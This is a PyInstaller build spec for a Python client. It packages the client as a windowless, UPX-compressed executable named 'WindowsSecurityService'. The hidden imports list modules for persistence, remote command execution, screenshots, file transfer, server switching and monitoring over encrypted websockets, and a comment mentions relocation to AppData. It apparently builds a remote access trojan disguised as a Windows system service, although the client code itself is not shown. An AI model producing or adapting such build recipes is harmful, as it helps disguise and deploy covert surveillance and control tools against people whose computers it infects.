# -*- mode: python ; coding: utf-8 -*-
# PyInstaller spec file
#
# Before building, generate the icon once:
#   python client/assets/generate_icon.py
#
# Build:
#   pyinstaller client.spec
#
# Deploy layout (next to the exe):
#   dist/
#   ├── WindowsSecurityService.exe
#   └── client/
#       └── config.yaml          ← required — edit server/secret before build

import sys
from pathlib import Path

block_cipher = None

a = Analysis(
    ['client/main.py'],
    pathex=[str(Path('.').resolve())],
    binaries=[],
    datas=[
        # config.yaml is bundled as a fallback so the exe works even after
        # relocation to AppData (where no client/ folder exists yet).
        # A client/config.yaml placed next to the exe always takes priority.
        ('client/config.yaml', 'client'),
        ('shared', 'shared'),
        ('server', 'server'),
    ],
    hiddenimports=[
        'client.paths',
        'client.persistence',
        'client.connection',
        'client.commands.registry',
        'client.commands.execute',
        'client.commands.screenshot',
        'client.commands.file_transfer',
        'client.commands.change_server',
        'client.commands.sysinfo',
        'client.commands.uninstall',
        'client.commands.update',
        'client.commands.monitor',
        'websockets',
        'websockets.legacy',
        'websockets.legacy.client',
        'cryptography',
        'cryptography.fernet',
        'yaml',
        'mss',
        'PIL',
        'PIL.Image',
        'psutil',
        'winreg',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['tkinter', 'unittest', 'test'],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='WindowsSecurityService',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='client/assets/icon.ico',
    version_file='client/assets/version_info.txt',
)
